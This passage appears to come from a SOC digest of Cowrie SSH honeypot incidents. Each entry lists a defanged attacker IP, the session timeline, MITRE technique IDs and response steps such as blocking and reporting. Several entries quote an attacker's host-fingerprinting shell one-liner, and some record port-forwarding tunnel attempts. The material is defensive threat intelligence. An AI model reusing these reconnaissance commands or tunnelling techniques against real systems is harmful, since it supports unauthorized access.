| **First Seen** | 2026-07-10 17:45 |
| **Last Seen** | 2026-07-10 17:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:45:38` | `cowrie.session.connect` |
| `2026-07-10 17:45:38` | `cowrie.client.version` |
| `2026-07-10 17:45:38` | `cowrie.client.kex` |
| `2026-07-10 17:45:40` | `cowrie.login.success` |
| `2026-07-10 17:45:41` | `cowrie.session.params` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.success` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.command.input` |
| `2026-07-10 17:45:41` | `cowrie.log.closed` |
| `2026-07-10 17:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2928d924b9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:47 |
| **Last Seen** | 2026-07-10 17:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:47:27` | `cowrie.session.connect` |
| `2026-07-10 17:47:27` | `cowrie.client.version` |
| `2026-07-10 17:47:27` | `cowrie.client.kex` |
| `2026-07-10 17:47:28` | `cowrie.login.success` |
| `2026-07-10 17:47:29` | `cowrie.session.params` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.success` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:29` | `cowrie.command.input` |
| `2026-07-10 17:47:30` | `cowrie.log.closed` |
| `2026-07-10 17:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d032cb2a8fa

| Field | Detail |
|---|---|
| **Source IP** | `111.193.181[.]226` |
| **First Seen** | 2026-07-10 17:47 |
| **Last Seen** | 2026-07-10 17:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:47:48` | `cowrie.session.connect` |
| `2026-07-10 17:47:48` | `cowrie.client.version` |
| `2026-07-10 17:47:48` | `cowrie.client.kex` |
| `2026-07-10 17:47:51` | `cowrie.login.success` |
| `2026-07-10 17:47:52` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.193.181[.]226` to AbuseIPDB if not already reported
- [ ] Block `111.193.181[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-890930fc8af0

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-07-10 17:48 |
| **Last Seen** | 2026-07-10 17:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:48:12` | `cowrie.session.connect` |
| `2026-07-10 17:48:13` | `cowrie.client.version` |
| `2026-07-10 17:48:13` | `cowrie.client.kex` |
| `2026-07-10 17:48:14` | `cowrie.login.success` |
| `2026-07-10 17:48:14` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1127d905fb26

| Field | Detail |
|---|---|
| **Source IP** | `65.20.211[.]96` |
| **First Seen** | 2026-07-10 17:48 |
| **Last Seen** | 2026-07-10 17:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:48:19` | `cowrie.session.connect` |
| `2026-07-10 17:48:20` | `cowrie.client.version` |
| `2026-07-10 17:48:20` | `cowrie.client.kex` |
| `2026-07-10 17:48:22` | `cowrie.login.success` |
| `2026-07-10 17:48:22` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.211[.]96` to AbuseIPDB if not already reported
- [ ] Block `65.20.211[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c48d07cabfef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:49 |
| **Last Seen** | 2026-07-10 17:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:49:21` | `cowrie.session.connect` |
| `2026-07-10 17:49:21` | `cowrie.client.version` |
| `2026-07-10 17:49:21` | `cowrie.client.kex` |
| `2026-07-10 17:49:22` | `cowrie.login.success` |
| `2026-07-10 17:49:23` | `cowrie.session.params` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.success` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.command.input` |
| `2026-07-10 17:49:23` | `cowrie.log.closed` |
| `2026-07-10 17:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b609d3fe474

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-07-10 17:51 |
| **Last Seen** | 2026-07-10 17:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:51:18` | `cowrie.session.connect` |
| `2026-07-10 17:51:19` | `cowrie.client.version` |
| `2026-07-10 17:51:19` | `cowrie.client.kex` |
| `2026-07-10 17:51:20` | `cowrie.login.success` |
| `2026-07-10 17:51:20` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77516442afaa

| Field | Detail |
|---|---|
| **Source IP** | `211.104.166[.]110` |
| **First Seen** | 2026-07-10 17:51 |
| **Last Seen** | 2026-07-10 17:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:51:26` | `cowrie.session.connect` |
| `2026-07-10 17:51:27` | `cowrie.client.version` |
| `2026-07-10 17:51:27` | `cowrie.client.kex` |
| `2026-07-10 17:51:29` | `cowrie.login.success` |
| `2026-07-10 17:51:30` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.104.166[.]110` to AbuseIPDB if not already reported
- [ ] Block `211.104.166[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06186a6b4c4e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:51 |
| **Last Seen** | 2026-07-10 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:51:27` | `cowrie.session.connect` |
| `2026-07-10 17:51:27` | `cowrie.client.version` |
| `2026-07-10 17:51:27` | `cowrie.client.kex` |
| `2026-07-10 17:51:27` | `cowrie.login.success` |
| `2026-07-10 17:51:28` | `cowrie.session.params` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.success` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.command.input` |
| `2026-07-10 17:51:28` | `cowrie.log.closed` |
| `2026-07-10 17:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc6958b065e

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-07-10 17:51 |
| **Last Seen** | 2026-07-10 17:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:51:46` | `cowrie.session.connect` |
| `2026-07-10 17:51:46` | `cowrie.client.version` |
| `2026-07-10 17:51:46` | `cowrie.client.kex` |
| `2026-07-10 17:51:48` | `cowrie.login.success` |
| `2026-07-10 17:51:48` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66981ea7c08f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:53 |
| **Last Seen** | 2026-07-10 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:53:56` | `cowrie.session.connect` |
| `2026-07-10 17:53:56` | `cowrie.client.version` |
| `2026-07-10 17:53:57` | `cowrie.client.kex` |
| `2026-07-10 17:53:57` | `cowrie.login.success` |
| `2026-07-10 17:53:58` | `cowrie.session.params` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.success` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.command.input` |
| `2026-07-10 17:53:58` | `cowrie.log.closed` |
| `2026-07-10 17:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2376aa95a21e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-07-10 17:56 |
| **Last Seen** | 2026-07-10 17:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:56:03` | `cowrie.session.connect` |
| `2026-07-10 17:56:04` | `cowrie.client.version` |
| `2026-07-10 17:56:04` | `cowrie.client.kex` |
| `2026-07-10 17:56:05` | `cowrie.login.success` |
| `2026-07-10 17:56:05` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9287338918be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:56 |
| **Last Seen** | 2026-07-10 17:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:56:13` | `cowrie.session.connect` |
| `2026-07-10 17:56:13` | `cowrie.client.version` |
| `2026-07-10 17:56:13` | `cowrie.client.kex` |
| `2026-07-10 17:56:15` | `cowrie.login.success` |
| `2026-07-10 17:56:16` | `cowrie.session.params` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.success` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:16` | `cowrie.command.input` |
| `2026-07-10 17:56:17` | `cowrie.log.closed` |
| `2026-07-10 17:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd2e1138dda

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 17:57 |
| **Last Seen** | 2026-07-10 17:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:57:10` | `cowrie.session.connect` |
| `2026-07-10 17:57:10` | `cowrie.client.version` |
| `2026-07-10 17:57:10` | `cowrie.client.kex` |
| `2026-07-10 17:57:12` | `cowrie.login.success` |
| `2026-07-10 17:57:13` | `cowrie.session.params` |
| `2026-07-10 17:57:13` | `cowrie.command.input` |
| `2026-07-10 17:57:14` | `cowrie.log.closed` |
| `2026-07-10 17:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0415460b74e

| Field | Detail |
|---|---|
| **Source IP** | `144.225.6[.]82` |
| **First Seen** | 2026-07-10 17:57 |
| **Last Seen** | 2026-07-10 17:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:57:27` | `cowrie.session.connect` |
| `2026-07-10 17:57:28` | `cowrie.client.version` |
| `2026-07-10 17:57:28` | `cowrie.client.kex` |
| `2026-07-10 17:57:30` | `cowrie.login.success` |
| `2026-07-10 17:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.6[.]82` to AbuseIPDB if not already reported
- [ ] Block `144.225.6[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8eae8879a45

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-07-10 17:57 |
| **Last Seen** | 2026-07-10 17:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:57:29` | `cowrie.session.connect` |
| `2026-07-10 17:57:29` | `cowrie.client.version` |
| `2026-07-10 17:57:29` | `cowrie.client.kex` |
| `2026-07-10 17:57:31` | `cowrie.login.success` |
| `2026-07-10 17:57:31` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5d5d01b986

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-10 17:57 |
| **Last Seen** | 2026-07-10 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:57:31` | `cowrie.session.connect` |
| `2026-07-10 17:57:31` | `cowrie.client.version` |
| `2026-07-10 17:57:31` | `cowrie.client.kex` |
| `2026-07-10 17:57:31` | `cowrie.login.success` |
| `2026-07-10 17:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf1fba0b53d

| Field | Detail |
|---|---|
| **Source IP** | `102.211.7[.]162` |
| **First Seen** | 2026-07-10 17:57 |
| **Last Seen** | 2026-07-10 17:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:57:36` | `cowrie.session.connect` |
| `2026-07-10 17:57:36` | `cowrie.client.version` |
| `2026-07-10 17:57:36` | `cowrie.client.kex` |
| `2026-07-10 17:57:37` | `cowrie.login.success` |
| `2026-07-10 17:57:37` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.211.7[.]162` to AbuseIPDB if not already reported
- [ ] Block `102.211.7[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-640e603ddc22

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:58 |
| **Last Seen** | 2026-07-10 17:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:58:01` | `cowrie.session.connect` |
| `2026-07-10 17:58:02` | `cowrie.client.version` |
| `2026-07-10 17:58:02` | `cowrie.client.kex` |
| `2026-07-10 17:58:03` | `cowrie.login.success` |
| `2026-07-10 17:58:05` | `cowrie.session.params` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
